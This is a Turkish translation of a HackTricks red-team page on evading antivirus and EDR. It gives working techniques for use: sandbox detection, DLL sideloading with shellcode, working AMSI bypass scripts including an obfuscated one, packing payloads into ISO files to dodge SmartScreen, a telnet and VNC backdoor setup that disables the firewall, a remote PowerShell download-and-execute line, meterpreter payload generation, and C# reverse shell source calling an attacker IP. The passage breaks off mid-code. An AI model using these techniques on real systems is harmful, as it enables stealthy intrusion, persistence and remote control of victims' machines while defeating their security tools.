# Antivirüs (AV) Atlatma

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**Bu sayfa** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** tarafından yazılmıştır!**

## **AV Kaçınma Metodolojisi**

Şu anda AV'ler, bir dosyanın kötü amaçlı olup olmadığını kontrol etmek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'ler için davranış analizi.

### **Statik tespit**

Statik tespit, bir ikili veya betikteki bilinen kötü amaçlı dizeleri veya baytlar dizilerini işaretleyerek ve ayrıca dosyadan bilgi çıkararak (örneğin dosya açıklaması, şirket adı, dijital imzalar, simge, toplam kontrol toplamı vb.) başarılır. Bu, bilinen genel araçları kullanmanın sizi daha kolay yakalanabileceği anlamına gelir, çünkü muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmişlerdir. Bu tür tespitleri atlatmanın birkaç yolu vardır:

* **Şifreleme**

İkili dosyayı şifrelerseniz, AV'nin programınızı algılama şansı olmaz, ancak programı hafızada şifrelemek ve çalıştırmak için bir yükleyiciye ihtiyacınız olacaktır.

* **Karıştırma**

Bazen AV'yi atlatmak için yapmanız gereken tek şey, ikili veya betiğinizde bazı dizeleri değiştirmektir, ancak bu, karıştırmak istediğiniz şeye bağlı olarak zaman alıcı bir görev olabilir.

* **Özel araçlar**

Kendi araçlarınızı geliştirirseniz, kötü imzalar olmayacaktır, ancak bu çok zaman ve çaba gerektirir.

{% hint style="info" %}
Windows Defender statik tespitine karşı kontrol etmek için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) iyi bir yoldur. Temelde dosyayı birden çok segmente böler ve Defender'a her birini ayrı ayrı taratmasını ister, bu şekilde, ikili dosyanızdaki işaretlenmiş dizeleri veya baytları tam olarak söyleyebilir.
{% endhint %}

Pratik AV Atlatma hakkında bu [YouTube çalma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) kesinlikle incelemenizi öneririm.

### **Dinamik analiz**

Dinamik analiz, AV'nin ikili dosyanızı bir kum havuzunda çalıştırması ve kötü amaçlı faaliyetleri izlemesi durumudur (örneğin, tarayıcınızın şifrelerini şifrelemeye çalışmak, LSASS üzerinde minidump yapmak vb.). Bu kısım biraz daha karmaşık olabilir, ancak kum havuzlarını atlatmak için yapabileceğiniz bazı şeyler şunlardır.

* **Çalışmadan önce uyuma** Uygulamanın nasıl uygulandığına bağlı olarak, AV'nin dinamik analizini atlatmanın harika bir yoludur. AV'ler dosyaları tararken kullanıcının iş akışını kesmemek için çok kısa bir süreye sahiptir, bu nedenle uzun uyumalar kullanmak, ikili dosyaların analizini bozabilir. Sorun şudur ki, birçok AV kum havuzları, uygulamanın nasıl uygulandığına bağlı olarak uykuyu atlayabilir.
* **Makinenin kaynaklarını kontrol etme** Genellikle Kum havuzlarının çalışması için çok az kaynağı vardır (örneğin, < 2GB RAM), aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada çok yaratıcı olabilirsiniz, örneğin CPU sıcaklığını veya hatta fan hızlarını kontrol ederek, her şeyin kum havuzunda uygulanmayacağını görebilirsiniz.
* **Makineye özgü kontroller** "contoso.local" alanına katılmış bir iş istasyonu kullanıcısını hedeflemek istiyorsanız, bilgisayarın alanını kontrol ederek belirttiğinizle eşleşip eşleşmediğini görebilirsiniz, eşleşmiyorsa, programınızı sonlandırabilirsiniz.

Microsoft Defender'ın Kum havuzu bilgisayar adının HAL9TH olduğu ortaya çıktı, bu nedenle, kötü amaçlı yazılımınızı patlatmadan önce bilgisayar adını kontrol edebilirsiniz, ad HAL9TH ile eşleşirse, bu Defender'ın kum havuzunda olduğunuzu gösterir, bu nedenle programınızı sonlandırabilirsiniz.

<figure><img src="../.gitbook/assets/image (206).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)'den Kum Havuzlarına karşı bazı gerçekten iyi ipuçları

<figure><img src="../.gitbook/assets/image (245).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu gönderide daha önce belirttiğimiz gibi, **genel araçlar** sonunda **algılanacaktır**, bu nedenle, kendinize şunu sormalısınız:

Örneğin, LSASS'ı dökmek istiyorsanız, **gerçekten mimikatz kullanmanız mı gerekiyor**? Yoksa daha az bilinen ve aynı zamanda LSASS'ı döken başka bir projeyi mi kullanabilirsiniz.

Doğru cevap muhtemelen ikincisidir. Örneğin mimikatz'ı ele alalım, muhtemelen AV'ler ve EDR'ler tarafından en çok işaretlenen kötü amaçlı yazılımlardan biri, hatta belki de en çok işaretlenenidir, projenin kendisi süper harika olsa da, AV'leri atlatmak için onunla çalışmak da kabus olabilir, bu nedenle ulaşmaya çalıştığınız hedefler için alternatiflere bakın.

{% hint style="info" %}
Kaçınma için yüklerinizi değiştirirken, lütfen **Defender'da otomatik örnek göndermeyi kapatın** ve lütfen, ciddi anlamda, **VIRUSTOTAL'A YÜKLEMEYİNİZ** eğer amacınız uzun vadede kaçınma ise. Belirli bir AV tarafından yükünüzün algılanıp algılanmadığını kontrol etmek istiyorsanız, otomatik örnek göndermeyi kapatmaya çalışın, sonuçtan memnun olana kadar orada test edin.
{% endhint %}

## EXE'ler vs DLL'ler

Mümkün olduğunda, her zaman **kaçınma için DLL'leri tercih edin**, deneyimime göre, DLL dosyaları genellikle **çok daha az algılanır** ve analiz edilir, bu nedenle bazı durumlarda algılanmadan kaçınmak için kullanabileceğiniz çok basit bir hile yöntemidir (tabii ki yükünüzün bir DLL olarak çalışma yolu varsa).

Bu resimde görebileceğimiz gibi, Havoc'tan bir DLL Yükü, antiscan.me'de 4/26 algılama oranına sahipken, EXE yükü 7/26 algılama oranına sahiptir.

<figure><img src="../.gitbook/assets/image (1127).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE yükü ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi, DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı hileler göstereceğiz.
## DLL Yan Yükleme ve Proxying

**DLL Yan Yükleme**, yükleyici tarafından kullanılan DLL arama sırasından faydalanarak hem kurban uygulamayı hem de kötü niyetli yükleri birlikte konumlandırarak çalışır.

DLL Yan Yükleme'ye duyarlı programları kontrol etmek için [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell betiğini kullanabilirsiniz:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Bu komut, "C:\Program Files\\" içinde DLL hijacking'e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılar.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi şiddetle öneririm**, bu teknik doğru bir şekilde uygulandığında oldukça gizlidir, ancak genel olarak bilinen DLL Sideloadable programlarını kullanırsanız, kolayca yakalanabilirsiniz.

Sadece bir kötü niyetli DLL'yi bir programın yüklemesini beklediği isimle yerleştirmek, yüklemenize neden olmaz, çünkü programın o DLL içinde belirli işlevleri beklemektedir, bu sorunu düzeltmek için başka bir teknik olan **DLL Proxying/Forwarding**'i kullanacağız.

**DLL Proxying**, programın proxy (ve kötü niyetli) DLL'den orijinal DLL'ye yaptığı çağrıları yönlendirir, böylece programın işlevselliğini korur ve yüklemenize olanak tanır.

[@flangvik](https://twitter.com/Flangvik/)'ten [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardır:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Son komut bize 2 dosya verecektir: bir DLL kaynak kodu şablonu ve orijinal yeniden adlandırılmış DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Bu sonuçlar şunlardır:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz (SGN ile kodlanmış) hem de proxy DLL, [antiscan.me](https://antiscan.me) sitesinde 0/26 Algılama oranına sahiptir! Bunu bir başarı olarak adlandırırdım.

<figure><img src="../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
DLL Yan Yükleme ve ayrıca [ippsec'in videosu](https://www.youtube.com/watch?v=3eROsG\_WNpE) hakkında daha detaylı bilgi edinmek için [S3cur3Th1sSh1t'in twitch VOD'unu](https://www.twitch.tv/videos/1644171543) izlemenizi **şiddetle tavsiye ederim**.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış işlemler, doğrudan sistem çağrıları ve alternatif yürütme yöntemleri kullanarak EDR'leri atlatmak için bir yük seti aracıdır`

Freeze'yi kullanarak shellcode'unuzu gizlice yükleyip ve yürütebilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kaçınma sadece bir kedi ve fare oyunudur, bugün işe yarayan yarın tespit edilebilir, bu yüzden sadece bir araca güvenmeyin, mümkünse birden fazla kaçınma tekniğini birleştirmeyi deneyin.
{% endhint %}

## AMSI (Anti-Malware Tarama Arayüzü)

AMSI, "[dosyasız kötü amaçlı yazılım](https://en.wikipedia.org/wiki/Fileless\_malware)" yaratılmıştır. Başlangıçta, AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu, bu yüzden eğer bir şekilde yüklemeleri **doğrudan bellekte** çalıştırabilirseniz, AV'nin bunu önlemek için yeterli görünürlüğü olmadığından yapabileceği bir şey yoktu.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

* Kullanıcı Hesap Kontrolü veya UAC (EXE, COM, MSI veya ActiveX yükseltmesi)
* PowerShell (betikler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
* Windows Betik Ana Bilgisayarı (wscript.exe ve cscript.exe)
* JavaScript ve VBScript
* Ofis VBA makroları

Antivirüs çözümlerine betik davranışlarını inceleme olanağı tanır, betik içeriğini şifrelenmemiş ve şifrelenmemiş bir formda ortaya çıkararak.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak Windows Defender'da aşağıdaki uyarıyı üretecektir.

<figure><img src="../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

Dikkat edin, `amsi:` öneki ekler ve ardından betiğin çalıştığı yürütülebilir dosyanın yolunu, bu durumda powershell.exe

Diskte herhangi bir dosya bırakmadık, ancak hala AMSI nedeniyle bellekte yakalandık.

AMSI'yi atlatmanın birkaç yolu vardır:

* **Gizleme**

AMSI genellikle statik tespitlerle çalıştığından, yüklemeye çalıştığınız betikleri değiştirmek tespit edilmeyi atlatmanın iyi bir yol olabilir.

Ancak, AMSI, birden fazla katmana sahip olsa bile betikleri şifresizleştirebilme yeteneğine sahiptir, bu nedenle şifreleme, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu, atlatmanın o kadar da basit olmadığını yapar. Yine de, bazen yapmanız gereken tek şey birkaç değişken adını değiştirmektir ve işte bu kadar, bu yüzden bir şeyin ne kadar işaretlendiğine bağlıdır.

* **AMSI Atlatma**

AMSI, bir DLL'yi powershell (ayrıca cscript.exe, wscript.exe vb.) işlemine yükleyerek uygulandığından, bu hata AMSI taramasını atlatmanın birkaç yolunu bulmuştur.

**Hata Zorlaması**

AMSI başlatmasını başarısız kılmak (amsiInitFailed), mevcut işlem için hiçbir tarama başlatılmayacağı anlamına gelir. Başlangıçta bu, [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmış ve Microsoft daha geniş kullanımı önlemek için bir imza geliştirmiştir.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Mevcut powershell işlemi için AMSI'nın kullanılamaz hale gelmesi için sadece bir satır powershell kodu gerekiyordu. Bu satır elbette AMSI tarafından işaretlendi, bu nedenle bu teknik kullanılmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş AMSI bypass.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Bellek Yaması**

Bu teknik başlangıçta [@RastaMouse](https://twitter.com/\_RastaMouse/) tarafından keşfedildi ve "AmsiScanBuffer" işlevi için amsi.dll'de (kullanıcı tarafından sağlanan girişi tarayan işlev) adres bulmayı ve bunu E\_INVALIDARG koduna geri dönmek için talimatlarla üzerine yazmayı içerir, bu şekilde, gerçek tarama sonucu 0 olarak dönecek ve temiz bir sonuç olarak yorumlanacaktır.

{% hint style="info" %}
Daha detaylı bir açıklama için [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.
{% endhint %}

AMSI'yi powershell ile atlatmak için kullanılan birçok başka teknik de vardır, bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/#amsi-bypass) ve [bu depoya](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

## Karıştırma

C# açık metin kodunu **karıştırmak**, derlemek için **metaprogramlama şablonları oluşturmak** veya derlenmiş ikili dosyaları **karıştırmak** için kullanılabilecek birkaç araç vardır:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# karıştırıcı**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu proje, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynak bir çatalını sağlayarak [kod karıştırma](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) ve müdahaleye dayanıklılığı sağlamayı amaçlar.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, derleme zamanında harici bir araç kullanmadan ve derleyiciyi değiştirmeden, `C++11/14` dilini kullanarak karışık kod üretmenin nasıl yapıldığını gösterir.
* [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz zorlaştıracak C++ şablon metaprogramlama çerçevesi tarafından oluşturulan karışık işlemler katmanı ekler.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys gibi çeşitli farklı pe dosyalarını karıştırabilen bir x64 ikili karıştırıcıdır.
* [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir yürütülebilir dosya için basit bir metamorfik kod motorudur.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM destekli diller için ince taneli bir kod karıştırma çerçevesidir. ROPfuscator, normal kontrol akışımızı bozan düzenli talimatları ROP zincirlerine dönüştürerek bir programı montaj kodu seviyesinde karıştırır.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim'de yazılmış bir .NET PE Şifreleyicisidir.
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilen ve ardından yükleyebilen bir araçtır.

## SmartScreen ve MoTW

İnternetten bazı yürütülebilir dosyaları indirirken ve çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaktan korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

SmartScreen genellikle bir itibar tabanlı yaklaşımla çalışır, yani nadiren indirilen uygulamalar SmartScreen'ı tetikler ve böylece son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (dosya yine de Daha Fazla Bilgi -> Yine de Çalıştır'a tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), İnternetten dosyalar indirildiğinde otomatik olarak oluşturulan ve indirilen dosyanın geldiği URL ile birlikte Zone.Identifier adında bir [NTFS Alternatif Veri Akışı](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))'dir.

<figure><img src="../.gitbook/assets/image (234).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'yi kontrol etme.</p></figcaption></figure>

{% hint style="info" %}
**Güvenilir** bir imzalama sertifikası ile imzalanan yürütülebilir dosyaların **SmartScreen'ı tetiklemeyeceğini** unutmamak önemlidir.
{% endhint %}

Payload'larınızın Mark of The Web'i almamasını sağlamanın çok etkili bir yolu, onları bir ISO gibi bir tür konteynerin içine paketlemektir. Bu, Mark-of-the-Web (MOTW)'nin **NTFS dışı** birimlere **uygulanamamasından** kaynaklanmaktadır.

<figure><img src="../.gitbook/assets/image (636).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), payload'ları Mark-of-the-Web'den kaçınmak için çıktı konteynerlerine paketleyen bir araçtır.

Örnek kullanım:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
İşte SmartScreen'i ISO dosyaları içine paketleyerek atlatma demo'su [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanılarak.

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Montaj Yansıması

C# ikili dosyalarını belleğe yükleme uzun süredir bilinmektedir ve hala AV tarafından yakalanmadan post-exploitation araçlarını çalıştırmanın harika bir yoludur.

Çünkü yük, diske dokunmadan doğrudan belleğe yükleneceğinden, sadece AMSI'yi sürekli olarak yamalamakla ilgilenmemiz gerekecektir.

Çoğu C2 çerçevesi (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# montajlarını doğrudan bellekte yürütme yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

* **Çatalla ve Çalıştır**

Bu, **yeni bir fedakar süreç başlatmayı**, post-exploitation kötü amaçlı kodunuzu bu yeni sürece enjekte etmeyi, kötü amaçlı kodunuzu yürütmeyi ve işiniz bittiğinde yeni süreci sonlandırmayı içerir. Çatalla ve çalıştır yönteminin avantajı, yürütmenin **Beacon implant sürecimizin dışında** gerçekleşmesidir. Bu, post-exploitation eylemimizde bir şeyler yanlış gider veya yakalanırsa, **implantın hayatta kalma şansının çok daha yüksek olması** anlamına gelir. Dezavantajı ise **Davranışsal Algılamalar** tarafından **yakalanma şansınızın daha yüksek** olmasıdır.

<figure><img src="../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

* **Satır İçi**

Bu, post-exploitation kötü amaçlı kodu **kendi sürecine enjekte etmekle** ilgilidir. Bu şekilde, yeni bir süreç oluşturmak ve AV tarafından taranmasını önlemekten kaçınabilirsiniz, ancak yükünüzün yürütülmesinde bir sorun çıkarsa, **beacon'ınızı kaybetme şansınızın çok daha yüksek** olduğu bir dezavantajı vardır.

<figure><img src="../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C# Montaj yükleme hakkında daha fazla bilgi edinmek isterseniz, lütfen bu makaleye göz atın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Ayrıca C# Montajlarını **PowerShell'den** yükleyebilirsiniz, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) önerildiği gibi, kompromize edilmiş makineye **Saldırgan Kontrolü Altındaki SMB paylaşımına yüklenen yorumlayıcı ortamına erişim vererek** diğer dilleri kullanarak kötü amaçlı kodu yürütmek mümkündür.

SMB paylaşımındaki Yorumlayıcı İkili dosyalarına ve ortama erişime izin vererek, kompromize edilmiş makinenin belleğinde bu dillerde **keyfi kodu yürütebilirsiniz**.

Repo, Defender'ın hala betikleri taramasını yaptığını ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esnekliğe sahip olduğumuzu** belirtmektedir. Bu dillerde rastgele şifrelenmemiş ters kabuk betiklerinin test edilmesi başarılı olmuştur.

## Gelişmiş Kaçınma

Kaçınma çok karmaşık bir konudur, bazen sadece bir sistemde birçok farklı telemetri kaynağını dikkate almanız gerekebilir, bu nedenle olgun ortamlarda tamamen algılanmadan kalmak neredeyse imkansızdır.

Karşı karşıya geldiğiniz her ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha Gelişmiş Kaçınma tekniklerine daha fazla bilgi edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi şiddetle tavsiye ederim.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

[@mariuszbit](https://twitter.com/mariuszbit) tarafından yapılan bu başka harika konuşmayı da izleyebilirsiniz Evasion in Depth.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı bulduğunu kontrol edin**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak, **Defender'ın hangi bölümü**nün kötü amaçlı olarak algıladığını **belirleyene kadar ikili dosyanın bölümlerini kaldırır** ve size ayırır.\
Aynı şeyi yapan başka bir araç [**avred**](https://github.com/dobin/avred) ve hizmeti sunan açık bir web sitesi olan [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde bulunmaktadır.

### **Telnet Sunucusu**

Windows10'a kadar, tüm Windows'lar **(yönetici olarak) yükleyebileceğiniz bir Telnet sunucusu** ile birlikte gelirdi:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Başlangıçta **başlat** ve şimdi **çalıştır**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet bağlantı noktasını değiştirin** (gizli) ve güvenlik duvarını devre dışı bırakın:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirme bağlantısı: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (kurulum değil, bin dosyalarını indirin)

**SUNUCUDA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

* _Disable TrayIcon_ seçeneğini etkinleştirin
* _VNC Password_ alanına bir şifre belirleyin
* _View-Only Password_ alanına bir şifre belirleyin

Daha sonra, _**winvnc.exe**_ ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın** içine taşıyın

#### **Ters bağlantı**

**Saldırgan**, **kendi sunucusu içinde** `vncviewer.exe -listen 5900` komutunu çalıştırmalıdır, böylece ters **VNC bağlantısını** almak için **hazır** olacaktır. Ardından, **kurbanın** içinde: winvnc daemon'ı başlatın `winvnc.exe -run` ve `winwnc.exe [-autoreconnect] -connect <saldırgan_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

* Zaten çalışıyorsa `winvnc` başlatmayın veya bir [pencere açılacaktır](https://i.imgur.com/1SROTTl.png). Çalışıp çalışmadığını kontrol etmek için `tasklist | findstr winvnc` komutunu kullanın
* Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın veya [yapılandırma penceresinin](https://i.imgur.com/rfMQWcf.png) açılmasına neden olacaktır
* Yardım almak için `winvnc -h` komutunu çalıştırmayın veya bir [pencere açılacaktır](https://i.imgur.com/oc18wcu.png)

### GreatSCT

İndirme bağlantısı: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT içinde:

Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` komutu ile **lister**'ı **başlatın** ve aşağıdaki komutu kullanarak **xml payload**'ı **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut savunucu işlemi çok hızlı bir şekilde sonlandıracaktır.**

### Kendi ters kabuk dosyamızı derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Ters Kabuk

Şununla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Kullanımı:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
